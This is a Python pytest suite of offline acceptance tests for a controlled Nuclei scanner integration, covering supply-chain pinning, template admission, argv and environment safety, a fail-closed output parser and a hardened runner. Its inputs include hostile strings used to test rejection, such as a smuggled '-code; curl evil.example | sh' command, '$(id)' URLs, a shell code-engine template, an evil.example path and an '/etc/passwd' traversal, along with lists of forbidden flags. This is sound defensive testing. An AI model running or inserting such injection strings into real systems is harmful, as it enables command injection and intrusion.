"""Phase 1.2 — Controlled Nuclei Integration: offline acceptance tests.

These prove, without network access, that Nuclei is pinned, admitted, isolated by contract, parsed
fail-closed and never self-confirming; that the controller alone builds jobs and the independent
verifier alone promotes; and that AEGIS_NATIVE and the console remain compatible. The live matrix
against the real pinned binary is in ``scripts/phase_1_2_acceptance.py``.
"""

from __future__ import annotations

import json
import re
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

import httpx
import pytest
import yaml
from nuclei_fakes import (
    GIT_CONFIG_TEMPLATE,
    REPO,
    TEMPLATE_ROOT,
    CountingTransport,
    ExecutorTransport,
    FakeNuclei,
    RunnerServer,
    fake_binary_sha256,
    make_fake_nuclei,
    manifest_pinning,
    ready_state,
)
from pydantic import ValidationError
from test_agent_loop import make_service

import aegis.main as main_module
from aegis.engine.adapters import DisabledEngineAdapter
from aegis.engine.catalog import get_engine_capability, get_engine_profile
from aegis.engine.contracts import (
    EngineEnvironment,
    EngineErrorCode,
    EngineExecutionStatus,
    FindingLifecycleState,
    SecurityEngine,
    VerifierConclusion,
)
from aegis.engine.lifecycle import correlate_reported_finding, record_verifier_conclusion
from aegis.engine.nuclei import NucleiAdapter, NucleiEngineJob, build_nuclei_job
from aegis.engine.policy import EnginePolicyRejection
from aegis.models import ScanCreate, ScanStatus
from aegis.safety import SafetyController, SafetyViolation
from aegis.scm_verifier import ScmProbeFacts, evaluate, has_git_config_structure
from aegis.service import ScanService
from aegis.settings import Settings
from aegis.storage import ScanStore
from aegis_nuclei.admission import admit_template, unexpected_template_files
from aegis_nuclei.contracts import NucleiBudgets, NucleiRunRequest
from aegis_nuclei.manifest import MANIFEST_PATH, load_manifest, manifest_digest
from aegis_nuclei.parser import AdmittedTemplate, parse_jsonl
from aegis_nuclei.profile import (
    FORBIDDEN_FLAGS,
    PROFILE_ID,
    assert_argv_safe,
    build_argv,
    child_environment,
)
from aegis_nuclei.targets import NUCLEI_TARGETS
from lab_api.main import app as lab_app
from nuclei_runner.attestation import attest, dangerous_environment
from nuclei_runner.execution import Executor

CAPABILITY = "nuclei_scm_metadata_exposure_v1"
MANIFEST = load_manifest()
ENTRY = MANIFEST.templates[0]
VULN = NUCLEI_TARGETS["synthetic-scm-vulnerable"]
PATCHED = NUCLEI_TARGETS["synthetic-scm-patched"]


# --- helpers ----------------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _controller_pins_the_offline_fake(monkeypatch: pytest.MonkeyPatch) -> None:
    """Offline, the runner executes a scripted fake engine. The controller still refuses any runner
    whose attested binary digest is not a manifest pin, so the offline suite pins the fake's
    (deterministic) digest on the controller side. The live acceptance uses the real pins."""

    import aegis.engine.nuclei as controller

    pinned = manifest_pinning(fake_binary_sha256())
    monkeypatch.setattr(controller, "load_manifest", lambda: pinned)


def _request(**overrides: Any) -> NucleiRunRequest:
    payload: dict[str, Any] = {
        "engine_execution_id": "exec-0000000000aa",
        "job_id": "job-0000000000aa",
        "run_id": "scan-0000000000aa",
        "scan_id": "scan-0000000000aa",
        "target_ref": "synthetic-scm-vulnerable",
        "origin": "http://lab-api:8001",
        "profile_id": PROFILE_ID,
        "template_set_id": MANIFEST.template_set_id,
        "manifest_digest": manifest_digest(),
        "budgets": {
            "max_requests": 1,
            "max_results": 4,
            "time_budget_ms": 30_000,
            "max_output_bytes": 65_536,
        },
        "nonce": "0" * 31 + "a",
        "correlation_id": "corr-00000000000000aa",
    }
    payload.update(overrides)
    return NucleiRunRequest.model_validate(payload)


def _fake(tmp_path: Path, mode: str = "match", **options: Any) -> tuple[FakeNuclei, Executor]:
    fake = make_fake_nuclei(tmp_path / "bin", mode, **options)
    state = ready_state(fake, tmp_path / "work")
    assert state.ready, state.failure_codes
    return fake, Executor(state)


def _admitted() -> dict[str, AdmittedTemplate]:
    return {
        ENTRY.template_id: AdmittedTemplate(ENTRY, Path("/opt/aegis-nuclei/templates") / ENTRY.path)
    }


def _line(match: bool, **extra: Any) -> str:
    record: dict[str, Any] = {
        "template-id": "git-config",
        "template-path": f"/opt/aegis-nuclei/templates/{ENTRY.path}",
        "info": {"name": ENTRY.name, "severity": "medium", "metadata": {"max-request": 1}},
        "type": "http",
        "host": "lab-api",
        "port": "8001",
        "scheme": "http",
        "url": VULN.target_url,
        "path": VULN.base_path,
        "ip": "172.27.0.3",
        "timestamp": "2026-09-19T10:10:47.417982712Z",
        "matcher-status": match,
    }
    if match:
        record["matched-at"] = f"{VULN.target_url}/.git/config"
        record["curl-command"] = "curl -H 'User-Agent: x' 'http://lab-api:8001/...'"
    record.update(extra)
    return json.dumps(record)


def _parse(data: bytes, **overrides: Any) -> Any:
    options = {"admitted": _admitted(), "target": VULN, "max_results": 4, "max_output_bytes": 65536}
    options.update(overrides)
    return parse_jsonl(data, **options)


def _nuclei_service(
    tmp_path: Path,
    mode: str = "match",
    *,
    runner: bool = True,
    enabled: bool = True,
    **options: Any,
) -> tuple[ScanService, FakeNuclei | None, ExecutorTransport, CountingTransport]:
    fake: FakeNuclei | None = None
    executor: Executor | None = None
    if runner:
        fake, executor = _fake(tmp_path, mode, **options)
    runner_transport = ExecutorTransport(executor)
    lab_transport = CountingTransport(httpx.ASGITransport(app=lab_app))
    settings = Settings(database_path=str(tmp_path / "scans.db"), nuclei_enabled=enabled)
    store = ScanStore(settings.database_path)
    store.initialize()
    from aegis.planner import DemoPlanner

    service = ScanService(
        settings,
        store=store,
        planner=DemoPlanner(),
        safety=SafetyController(settings),
        transport=lab_transport,
        nuclei_transport=runner_transport,
    )
    return service, fake, runner_transport, lab_transport


async def _run(service: ScanService, **create: Any) -> Any:
    scan = service.create(ScanCreate(capability=CAPABILITY, **create))
    await service.run(scan.id)
    result = service.store.get(scan.id)
    assert result is not None
    return result


def _events(service: ScanService, scan_id: str) -> list[str]:
    return [str(row["event"]) for row in service.store.audit(scan_id)]


# --- 1. supply chain pinning ------------------------------------------------------------------


def test_engine_and_templates_are_exactly_pinned() -> None:
    assert MANIFEST.engine.version == "v3.11.1"
    assert MANIFEST.engine.upstream_tag_commit == "a8c88feb4a1c8e961b7902534ce3af97e9d524a4"
    assert MANIFEST.upstream_templates.release == "v10.4.8"
    assert MANIFEST.upstream_templates.commit == "e5f19e6144135e107962bb943231413796fd7fe7"
    assert set(MANIFEST.engine.artifacts) == {"linux_arm64", "linux_amd64"}
    dockerfile = (REPO / "deploy/nuclei-runner/Dockerfile").read_text()
    for artifact in MANIFEST.engine.artifacts.values():
        assert f"--checksum=sha256:{artifact.asset_sha256}" in dockerfile
        assert artifact.asset in dockerfile
    assert re.search(r"python:3\.12-slim@sha256:[a-f0-9]{64}", dockerfile)
    lock = (REPO / "deploy/nuclei-runner/requirements.lock").read_text()
    requirements = [line for line in lock.splitlines() if "==" in line]
    assert requirements and all("--hash=sha256:" in lock.split(req, 1)[1] for req in requirements)
    assert "--require-hashes" in dockerfile


def test_no_floating_versions_or_runtime_downloads() -> None:
    for path in ("deploy/nuclei-runner/Dockerfile", "docker-compose.nuclei.yml"):
        text = (REPO / path).read_text()
        assert ":latest" not in text and "@latest" not in text
        assert "update-templates" not in text and "-ut" not in text.split()
    # The only remote fetches are the two checksum-pinned release archives at BUILD time.
    urls = re.findall(r"https://\S+", (REPO / "deploy/nuclei-runner/Dockerfile").read_text())
    assert all("releases/download/v3.11.1/" in url for url in urls)


def test_manifest_template_bytes_and_license_match_pins() -> None:
    admission = admit_template(TEMPLATE_ROOT, ENTRY)
    assert admission.admitted, admission.violations
    assert admission.sha256 == ENTRY.sha256
    assert admission.signature_line_fingerprint == ENTRY.signature.digest_fingerprint
    assert unexpected_template_files(TEMPLATE_ROOT, MANIFEST) == []
    import hashlib

    license_bytes = (TEMPLATE_ROOT / "LICENSE.md").read_bytes()
    assert hashlib.sha256(license_bytes).hexdigest() == MANIFEST.upstream_templates.license_sha256


def test_manifest_digest_is_the_file_digest() -> None:
    import hashlib

    assert manifest_digest() == hashlib.sha256(MANIFEST_PATH.read_bytes()).hexdigest()
    assert len(MANIFEST.templates) == 1 and ENTRY.template_id == "git-config"
    assert ENTRY.methods == ("GET",) and ENTRY.max_requests == 1 and ENTRY.redirects == "DISABLED"


def test_compose_topology_and_runner_hardening_are_fail_closed() -> None:
    base = yaml.safe_load((REPO / "docker-compose.yml").read_text())
    overlay = yaml.safe_load((REPO / "docker-compose.nuclei.yml").read_text())
    services = overlay["services"]
    networks = overlay["networks"]
    runner = services["nuclei-runner"]

    assert all(networks[name].get("internal") is True for name in ("engine-rpc", "nuclei-target"))
    assert base["networks"]["security-lab"]["internal"] is True
    assert set(runner["networks"]) == {"engine-rpc", "nuclei-target"}
    assert "security-lab" not in runner["networks"]
    assert set(services["control-plane"]["networks"]) == {"security-lab", "engine-rpc"}
    assert set(services["lab-api"]["networks"]) == {"security-lab", "nuclei-target"}
    assert "ports" not in runner and "volumes" not in runner
    assert runner["read_only"] is True and runner["user"] == "10001:10001"
    assert runner["cap_drop"] == ["ALL"]
    assert runner["security_opt"] == ["no-new-privileges:true"]
    assert runner["pids_limit"] == 64 and runner["mem_limit"] == "512m"
    assert runner["cpus"] == 1.0 and runner["environment"] == {}
    assert runner["tmpfs"] == ["/work:size=16m,mode=0700,uid=10001,gid=10001,nosuid,nodev"]

    dockerfile = (REPO / "deploy/nuclei-runner/Dockerfile").read_text()
    assert "USER 10001:10001" in dockerfile
    assert 'ENTRYPOINT ["python", "-m", "nuclei_runner"]' in dockerfile
    assert "rm -f /bin/bash /bin/dash /bin/sh" in dockerfile
    assert "docker.sock" not in (REPO / "docker-compose.nuclei.yml").read_text()


# --- 2. template admission (fail closed) ------------------------------------------------------


def _variant(tmp_path: Path, text: str) -> tuple[Path, Any]:
    root = tmp_path / "templates"
    target = root / ENTRY.path
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(text)
    import hashlib

    entry = ENTRY.model_copy(update={"sha256": hashlib.sha256(text.encode()).hexdigest()})
    return root, entry


def test_modified_template_fails_checksum(tmp_path: Path) -> None:
    root = tmp_path / "templates"
    target = root / ENTRY.path
    target.parent.mkdir(parents=True)
    target.write_text(GIT_CONFIG_TEMPLATE.read_text().replace("[core]", "[c0re]"))
    admission = admit_template(root, ENTRY)
    assert not admission.admitted and "CHECKSUM_MISMATCH" in admission.violations


def test_unsigned_template_is_rejected(tmp_path: Path) -> None:
    text = "".join(
        line
        for line in GIT_CONFIG_TEMPLATE.read_text().splitlines(True)
        if not line.startswith("# digest:")
    )
    root, entry = _variant(tmp_path, text)
    admission = admit_template(root, entry)
    assert not admission.admitted and "UNSIGNED" in admission.violations


def test_unknown_and_symlinked_templates_are_rejected(tmp_path: Path) -> None:
    root = tmp_path / "templates"
    (root / "http").mkdir(parents=True)
    (root / "http" / "extra.yaml").write_text("id: extra\n")
    assert unexpected_template_files(root, MANIFEST) == ["http/extra.yaml"]
    link = root / ENTRY.path
    link.parent.mkdir(parents=True, exist_ok=True)
    link.symlink_to(GIT_CONFIG_TEMPLATE)
    assert admit_template(root, ENTRY).violations == ("NOT_A_REGULAR_FILE",)


def _mutated(mutator: Any) -> str:
    text = GIT_CONFIG_TEMPLATE.read_text()
    body, signature = text.rsplit("# digest:", 1)
    doc = yaml.safe_load(body)
    mutator(doc)
    return yaml.safe_dump(doc, sort_keys=False) + "# digest:" + signature


_MUTATIONS: dict[str, Any] = {
    "code": lambda d: d.update(code=[{"engine": ["sh"], "source": "id"}]),
    "javascript": lambda d: d.update(javascript=[{"code": "1"}]),
    "headless": lambda d: d.update(headless=[{"steps": []}]),
    "file": lambda d: d.update(file=[{"extensions": ["all"]}]),
    "network": lambda d: d.update(network=[{"host": ["{{Hostname}}"]}]),
    "tcp": lambda d: d.update(tcp=[{"host": ["{{Hostname}}"]}]),
    "dns": lambda d: d.update(dns=[{"name": "{{FQDN}}"}]),
    "websocket": lambda d: d.update(websocket=[{"address": "{{BaseURL}}"}]),
    "workflows": lambda d: d.update(workflows=[{"template": "x.yaml"}]),
    "flow": lambda d: d.update(flow="http(1)"),
    "variables": lambda d: d.update(variables={"a": "{{env('HOME')}}"}),
    "post_method": lambda d: d["http"][0].update(method="POST"),
    "body": lambda d: d["http"][0].update(body="a=1"),
    "raw": lambda d: d["http"][0].update(raw=["GET / HTTP/1.1\nHost: x\n\n"]),
    "payloads": lambda d: d["http"][0].update(payloads={"p": ["a"]}, attack="batteringram"),
    "redirects": lambda d: d["http"][0].update(redirects=True, **{"max-redirects": 3}),
    "host_redirects": lambda d: d["http"][0].update(**{"host-redirects": True}),
    "headers": lambda d: d["http"][0].update(headers={"Authorization": "Bearer x"}),
    "fuzzing": lambda d: d["http"][0].update(fuzzing=[{"part": "query"}]),
    "interactsh": lambda d: d["http"][0]["path"].__setitem__(
        0, "{{BaseURL}}/?u={{interactsh-url}}"
    ),
    "env_access": lambda d: d["http"][0]["matchers"].append(
        {"type": "dsl", "dsl": ["{{env('X')}}"]}
    ),
    "absolute_url": lambda d: d["http"][0]["path"].__setitem__(
        0, "http://evil.example/.git/config"
    ),
    "root_url": lambda d: d["http"][0]["path"].__setitem__(0, "{{RootURL}}/.git/config"),
    "budget": lambda d: d["http"][0]["path"].append("{{BaseURL}}/.git/HEAD"),
    "declared_budget": lambda d: d["info"]["metadata"].update(**{"max-request": 5}),
    "internal_extractor": lambda d: d["http"][0]["extractors"][0].update(internal=True),
    "matcher_name": lambda d: d["http"][0]["matchers"][0].update(name="unapproved"),
    "severity": lambda d: d["info"].update(severity="critical"),
    "template_id": lambda d: d.update(id="other-template"),
    "unknown_top": lambda d: d.update(**{"self-contained": True}),
    "unknown_request_key": lambda d: d["http"][0].update(**{"skip-variables-check": True}),
}


@pytest.mark.parametrize("name", sorted(_MUTATIONS))
def test_structural_admission_rejects_forbidden_features(tmp_path: Path, name: str) -> None:
    root, entry = _variant(tmp_path, _mutated(_MUTATIONS[name]))
    admission = admit_template(root, entry)
    assert not admission.admitted, name
    assert admission.violations


def test_unmodified_structure_round_trip_is_admitted(tmp_path: Path) -> None:
    root, entry = _variant(tmp_path, _mutated(lambda d: None))
    assert admit_template(root, entry).admitted


# --- 3. fixed profile -------------------------------------------------------------------------


def _help_flags() -> set[str]:
    text = (Path(__file__).parent / "fixtures/nuclei-3.11.1-help.txt").read_text()
    return set(re.findall(r"(?<![\w-])(-[a-z][a-z0-9-]*)", text))


def test_argv_uses_only_flags_of_the_pinned_version() -> None:
    argv = build_argv(
        binary=Path("/opt/aegis-nuclei/bin/nuclei"),
        template_paths=[Path("/opt/aegis-nuclei/templates") / ENTRY.path],
        target_url=VULN.target_url,
        output_file=Path("/work/x/results.jsonl"),
        max_time_seconds=28,
    )
    flags = {token for token in argv[1:] if token.startswith("-")}
    assert flags <= _help_flags(), flags - _help_flags()
    for required in (
        "-jsonl",
        "-omit-raw",
        "-omit-template",
        "-no-color",
        "-no-stdin",
        "-disable-update-check",
        "-no-interactsh",
        "-disable-redirects",
        "-disable-unsigned-templates",
        "-matcher-status",
        "-disable-clustering",
    ):
        assert required in argv
    assert argv[argv.index("-type") + 1] == "http"
    assert argv[argv.index("-concurrency") + 1] == "1"
    assert argv[argv.index("-bulk-size") + 1] == "1"
    assert argv[argv.index("-retries") + 1] == "0"
    assert argv[argv.index("-rate-limit") + 1] == "2"
    assert int(argv[argv.index("-response-size-read") + 1]) == 65536
    assert not flags & FORBIDDEN_FLAGS
    assert isinstance(argv, list) and all(isinstance(token, str) for token in argv)
    assert [argv[i + 1] for i, argument in enumerate(argv) if argument == "-t"] == [
        f"/opt/aegis-nuclei/templates/{ENTRY.path}"
    ]


@pytest.mark.parametrize(
    "token", ["-code", "-headless", "-dast", "-ai", "-dashboard", "-H", "-turl", "-ut", "-sf"]
)
def test_forbidden_flags_are_refused(token: str) -> None:
    with pytest.raises(ValueError):
        assert_argv_safe(["nuclei", token])


@pytest.mark.parametrize("bad", ["http://lab-api:8001/x;id", "http://x/$(id)", "a\nb", "a|b"])
def test_shell_metacharacters_are_refused(bad: str) -> None:
    with pytest.raises(ValueError):
        build_argv(
            binary=Path("/n"),
            template_paths=[Path("/t.yaml")],
            target_url=bad,
            output_file=Path("/o"),
            max_time_seconds=10,
        )


def test_child_environment_is_constructed_not_inherited(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("NUCLEI_ARGS", "-code")
    monkeypatch.setenv("PDCP_API_KEY", "pd-secret")
    env = child_environment(Path("/work/x/home"))
    assert not any(k.startswith(("NUCLEI_", "PDCP_")) for k in env)
    assert "HTTP_PROXY" not in env and "AI_AUTH_TOKEN" not in env
    assert env["DISABLE_NUCLEI_TEMPLATES_PUBLIC_DOWNLOAD"] == "true"
    assert env["DISABLE_CLOUD_UPLOAD"] == "true"
    assert env["HOME"] == env["TMPDIR"] == "/work/x/home"
    assert dangerous_environment({"NUCLEI_ARGS": "x", "PATH": "/bin"}) == ["NUCLEI_ARGS"]
    assert dangerous_environment({"NUCLEI_SIGNATURE_PUBLIC_KEY": "k"})
    assert dangerous_environment({"PDCP_API_KEY": "k"}) and dangerous_environment(
        {"HTTPS_PROXY": "p"}
    )
    assert dangerous_environment({"AI_AUTH_TOKEN": "t"})


# --- 4. strict JSONL parser -------------------------------------------------------------------


def test_parser_accepts_match_strips_sensitive_fields_and_is_deterministic() -> None:
    first = _parse((_line(True) + "\n").encode())
    later = _parse((_line(True, timestamp="2026-09-19T11:00:00Z") + "\n").encode())
    assert first.summary.status == "PARSED" and first.coverage_complete
    assert first.results[0].matcher_status and first.results[0].checked_path.endswith(
        "/.git/config"
    )
    assert {"curl-command", "ip"} <= set(first.summary.stripped_fields)
    assert first.results[0].record_digest == later.results[0].record_digest
    dumped = first.results[0].model_dump_json()
    assert "curl" not in dumped and "User-Agent" not in dumped and "172.27" not in dumped


def test_parser_no_match_is_coverage_not_pass() -> None:
    outcome = _parse((_line(False) + "\n").encode())
    assert outcome.coverage_complete and outcome.summary.unmatched == 1
    assert not outcome.results[0].matcher_status


def test_parser_error_record_means_incomplete_coverage() -> None:
    outcome = _parse((_line(False, error="port closed or filtered") + "\n").encode())
    assert outcome.summary.status == "PARSED" and not outcome.coverage_complete
    assert outcome.results[0].error_class == "TARGET_UNREACHABLE"


def test_parser_collapses_identical_duplicates_and_rejects_conflicts() -> None:
    dup = _parse(
        (_line(True) + "\n" + _line(True, timestamp="2026-09-19T12:00:00Z") + "\n").encode()
    )
    assert dup.summary.status == "PARSED" and dup.summary.duplicates_collapsed == 1
    assert len(dup.results) == 1
    conflict = _parse((_line(True) + "\n" + _line(False) + "\n").encode())
    assert conflict.summary.status == "MALFORMED" and not conflict.results


@pytest.mark.parametrize(
    ("data", "status"),
    [
        (b"", "EMPTY"),
        (_line(True).encode(), "TRUNCATED"),
        (b'{"template-id": "git-config"\n', "MALFORMED"),
        (b"\xff\xfe\n", "MALFORMED"),
        (b"[1,2]\n", "MALFORMED"),
        (b'{"template-id":"a","template-id":"b"}\n', "MALFORMED"),
        (((_line(False) + "\n") * 5).encode(), "OVERSIZED"),
        ((json.dumps({"x": "a" * 20000}) + "\n").encode(), "OVERSIZED"),
    ],
)
def test_parser_fails_closed(data: bytes, status: str) -> None:
    outcome = _parse(data)
    assert outcome.summary.status == status
    assert not outcome.results and not outcome.coverage_complete


def test_parser_total_size_bound() -> None:
    outcome = _parse((_line(True) + "\n").encode(), max_output_bytes=100)
    assert outcome.summary.status == "OVERSIZED"


@pytest.mark.parametrize(
    "extra",
    [
        {"response": "HTTP/1.1 200 OK\r\n\r\n[core]"},
        {"request": "GET / HTTP/1.1"},
        {"template-encoded": "aWQ="},
        {"interaction": {"protocol": "dns"}},
        {"global-matchers": True},
        {"template-id": "community-other"},
        {"template-path": "/var/aegis-invalid/evil.yaml"},
        {"host": "evil.example"},
        {"port": "9999"},
        {"scheme": "https"},
        {"url": "http://lab-api:8001/other"},
        {"matched-at": "http://evil.example/.git/config"},
        {"matched-at": "http://lab-api:8001/lab/nuclei/vulnerable/.git/HEAD"},
        {"matcher-name": "unapproved"},
        {"type": "network"},
        {"info": {"name": ENTRY.name, "severity": "critical"}},
        {"matcher-status": "true"},
    ],
)
def test_parser_rejects_unexpected_identity_origin_or_raw_data(extra: dict[str, Any]) -> None:
    outcome = _parse((_line(True, **extra) + "\n").encode())
    assert outcome.summary.status == "MALFORMED"
    assert not outcome.results


# --- 5. typed RPC contract --------------------------------------------------------------------


@pytest.mark.parametrize(
    "field",
    [
        "command",
        "args",
        "argv",
        "flags",
        "env",
        "environment",
        "template",
        "template_id",
        "template_path",
        "templates",
        "url",
        "target_url",
        "path",
        "headers",
        "cookies",
        "credential",
        "authorization",
        "shell",
        "template_url",
        "proxy",
    ],
)
def test_rpc_request_forbids_arbitrary_fields(field: str) -> None:
    payload = _request().model_dump(mode="json")
    payload[field] = "-code; curl evil.example | sh"
    with pytest.raises(ValidationError):
        NucleiRunRequest.model_validate_json(json.dumps(payload))


@pytest.mark.parametrize(
    "origin",
    [
        "http://lab-api:8001/path",
        "http://lab-api:8001?x=1",
        "http://user:pw@lab-api:8001",
        "file:///etc",
    ],
)
def test_rpc_request_origin_is_bare(origin: str) -> None:
    with pytest.raises(ValidationError):
        _request(origin=origin)


def test_rpc_request_is_strict_about_types() -> None:
    payload = _request().model_dump(mode="json")
    payload["budgets"]["max_requests"] = "1"
    with pytest.raises(ValidationError):
        NucleiRunRequest.model_validate_json(json.dumps(payload))
    payload["budgets"]["max_requests"] = 99
    with pytest.raises(ValidationError):
        NucleiRunRequest.model_validate_json(json.dumps(payload))


# --- 6. runner (real subprocess path, fake engine) ---------------------------------------------


def test_runner_boot_attestation_ready_and_signature_probe(tmp_path: Path) -> None:
    fake, executor = _fake(tmp_path)
    attestation = executor.state.attestation()
    assert attestation.ready and attestation.signature_probe == "SIGNED_VERIFIED"
    assert attestation.templates[0].signature_status == "SIGNED_VERIFIED"
    probe = [c for c in fake.calls() if "-u" in c["argv"]]
    assert probe and all(
        c["argv"][c["argv"].index("-u") + 1] == "http://127.0.0.1:9" for c in probe
    )
    assert fake.run_calls() == []  # boot never touches a target


@pytest.mark.parametrize(
    ("options", "code"),
    [
        ({"version": "v3.10.0"}, "ENGINE_VERSION_MISMATCH"),
        ({"validate": False}, "TEMPLATE_VALIDATION_FAILED"),
        ({"signed": False}, "SIGNATURE_NOT_VERIFIED"),
    ],
)
def test_runner_not_ready_on_engine_problems(
    tmp_path: Path, options: dict[str, Any], code: str
) -> None:
    fake = make_fake_nuclei(tmp_path / "bin", "match", **options)
    state = ready_state(fake, tmp_path / "work")
    assert not state.ready and code in state.failure_codes


def test_runner_not_ready_on_dangerous_env_or_tampered_templates(tmp_path: Path) -> None:
    fake = make_fake_nuclei(tmp_path / "bin", "match")
    from aegis_nuclei.manifest import manifest_digest as digest
    from nuclei_runner.attestation import RunnerState

    state = RunnerState(
        manifest=manifest_pinning(fake.sha256()),
        manifest_digest=digest(),
        binary=fake.binary,
        template_root=TEMPLATE_ROOT,
        work_root=tmp_path / "w1",
    )
    (tmp_path / "w1").mkdir()
    assert "DANGEROUS_ENVIRONMENT" in attest(state, environ={"NUCLEI_ARGS": "-code"}).failure_codes
    tampered = tmp_path / "tpl"
    (tampered / ENTRY.path).parent.mkdir(parents=True)
    (tampered / ENTRY.path).write_text(GIT_CONFIG_TEMPLATE.read_text() + "\n# tampered\n")
    (tampered / "LICENSE.md").write_bytes((TEMPLATE_ROOT / "LICENSE.md").read_bytes())
    state2 = ready_state(fake, tmp_path / "w2", template_root=tampered)
    assert not state2.ready and "TEMPLATE_INTEGRITY_FAILURE" in state2.failure_codes
    response = Executor(state2).run(_request())
    assert response.status == "REJECTED" and response.error_code == "RUNNER_NOT_READY"
    assert fake.run_calls() == []


def test_runner_binary_substitution_fails_closed(tmp_path: Path) -> None:
    fake = make_fake_nuclei(tmp_path / "bin", "match")
    from aegis_nuclei.manifest import manifest_digest as digest
    from nuclei_runner.attestation import RunnerState

    state = RunnerState(
        manifest=load_manifest(),  # real pins: the fake binary cannot match them
        manifest_digest=digest(),
        binary=fake.binary,
        template_root=TEMPLATE_ROOT,
        work_root=tmp_path / "w",
    )
    (tmp_path / "w").mkdir()
    attest(state, environ={})
    assert not state.ready and "ENGINE_INTEGRITY_FAILURE" in state.failure_codes
    assert state.attestation().engine.pinned is False


def test_runner_executes_fixed_argv_with_constructed_env(tmp_path: Path) -> None:
    fake, executor = _fake(tmp_path, "match")
    response = executor.run(_request())
    assert response.status == "COMPLETED" and response.coverage_complete
    assert response.results[0].matcher_status and response.http_connections == 1
    assert response.signed_templates_executed == 1 and response.exit_class == "OK"
    call = fake.run_calls()[0]
    argv = call["argv"]
    assert argv[argv.index("-u") + 1] == VULN.target_url
    assert argv[argv.index("-t") + 1] == str(TEMPLATE_ROOT / ENTRY.path)
    assert set(call["env"]) <= {
        "PATH",
        "LANG",
        "HOME",
        "TMPDIR",
        "DISABLE_NUCLEI_TEMPLATES_PUBLIC_DOWNLOAD",
        "DISABLE_NUCLEI_TEMPLATES_GITHUB_DOWNLOAD",
        "DISABLE_NUCLEI_TEMPLATES_GITLAB_DOWNLOAD",
        "DISABLE_NUCLEI_TEMPLATES_AWS_DOWNLOAD",
        "DISABLE_NUCLEI_TEMPLATES_AZURE_DOWNLOAD",
        "DISABLE_CLOUD_UPLOAD",
        "DISABLE_CLOUD_UPLOAD_WRN",
        "PWD",
        "LC_CTYPE",
        "SHLVL",
        "_",
    }
    assert not any(k.startswith(("NUCLEI_", "PDCP_")) for k in call["env"])
    assert not (executor.state.work_root / "exec-0000000000aa").exists()  # scratch removed


@pytest.mark.parametrize(
    ("overrides", "code"),
    [
        ({"target_ref": "production-bank-api"}, "UNKNOWN_TARGET"),
        ({"origin": "http://evil.example:80"}, "ORIGIN_MISMATCH"),
        ({"profile_id": "NUCLEI_FULL_COMMUNITY"}, "UNKNOWN_PROFILE"),
        ({"template_set_id": "community-all"}, "UNKNOWN_TEMPLATE_SET"),
        ({"manifest_digest": "f" * 64}, "MANIFEST_DIGEST_MISMATCH"),
    ],
)
def test_runner_defense_in_depth_rejects_before_any_execution(
    tmp_path: Path, overrides: dict[str, Any], code: str
) -> None:
    fake, executor = _fake(tmp_path)
    response = executor.run(_request(**overrides))
    assert response.status == "REJECTED" and response.error_code == code
    assert response.results == () and fake.run_calls() == []


def test_runner_rejects_replayed_nonce(tmp_path: Path) -> None:
    fake, executor = _fake(tmp_path)
    assert executor.run(_request()).status == "COMPLETED"
    replay = executor.run(_request(engine_execution_id="exec-0000000000bb"))
    assert replay.status == "REJECTED" and replay.error_code == "REPLAYED_NONCE"
    assert len(fake.run_calls()) == 1


@pytest.mark.parametrize(
    ("mode", "options", "code", "exit_class"),
    [
        ("nonzero", {}, "ENGINE_FATAL", "NONZERO_EXIT"),
        ("malformed", {}, "OUTPUT_MALFORMED", "OK"),
        ("truncated", {}, "OUTPUT_TRUNCATED", "OK"),
        ("empty", {}, "COVERAGE_INCOMPLETE", "OK"),
        ("oversized", {}, "OUTPUT_OVERSIZED", "OK"),
        ("raw_leak", {}, "OUTPUT_MALFORMED", "OK"),
        ("unknown_template", {}, "OUTPUT_MALFORMED", "OK"),
        ("redirect_escape", {}, "OUTPUT_MALFORMED", "OK"),
        ("unexpected_key", {}, "OUTPUT_MALFORMED", "OK"),
        ("conflict", {}, "OUTPUT_MALFORMED", "OK"),
        ("huge_stdout", {}, "OUTPUT_OVERSIZED", "OUTPUT_OVERSIZED"),
        ("match", {"connections": 5}, "REQUEST_BUDGET_EXCEEDED", "OK"),
    ],
)
def test_runner_fails_closed_on_bad_engine_behaviour(
    tmp_path: Path, mode: str, options: dict[str, Any], code: str, exit_class: str
) -> None:
    _, executor = _fake(tmp_path, mode, **options)
    response = executor.run(_request())
    assert response.status == "FAILED", response
    assert response.error_code == code and response.exit_class == exit_class
    assert response.results == () and not response.coverage_complete


def test_runner_unsigned_at_execution_fails_closed(tmp_path: Path) -> None:
    fake, executor = _fake(tmp_path, "match")
    fake.set("match", signed=False)
    response = executor.run(_request())
    assert response.status == "FAILED" and response.error_code == "UNSIGNED_TEMPLATE_SKIPPED"


def test_runner_timeout_is_killed_and_never_passes(tmp_path: Path) -> None:
    _, executor = _fake(tmp_path, "timeout")
    budgets = NucleiBudgets(
        max_requests=1, max_results=4, time_budget_ms=5_000, max_output_bytes=65_536
    )
    response = executor.run(_request(budgets=budgets))
    assert response.status == "FAILED" and response.error_code == "EXECUTION_TIMEOUT"
    assert response.exit_class == "TIMEOUT" and not response.coverage_complete


def test_runner_http_server_is_strict(tmp_path: Path) -> None:
    _, executor = _fake(tmp_path)

    def call(
        method: str, path: str, body: bytes | None = None, ctype: str = "application/json"
    ) -> tuple[int, dict[str, Any]]:
        request = urllib.request.Request(server.url + path, data=body, method=method)  # noqa: S310
        if body is not None:
            request.add_header("Content-Type", ctype)
        try:
            with urllib.request.urlopen(request, timeout=10) as response:  # noqa: S310
                return response.status, json.loads(response.read())
        except urllib.error.HTTPError as error:
            return error.code, json.loads(error.read() or b"{}")

    with RunnerServer(executor) as server:
        assert call("GET", "/health") == (200, {"status": "READY"})
        status, attestation = call("GET", "/v1/attestation")
        assert status == 200 and attestation["ready"] is True
        good = _request().model_dump_json().encode()
        status, body = call("POST", "/v1/run", good)
        assert status == 200 and body["status"] == "COMPLETED"
        assert call("POST", "/v1/run", good, ctype="text/plain")[0] == 415
        assert call("POST", "/v1/run", b"x" * 5000)[0] == 413
        assert call("POST", "/v1/run", b"{not json")[0] == 400
        injected = json.loads(good)
        injected["flags"] = ["-code"]
        assert call("POST", "/v1/run", json.dumps(injected).encode())[0] == 400
        assert call("GET", "/v1/run")[0] == 404
        assert call("PUT", "/v1/run", good)[0] == 405
        assert call("GET", "/../../etc/passwd")[0] == 404


# --- 7. controller job policy -----------------------------------------------------------------


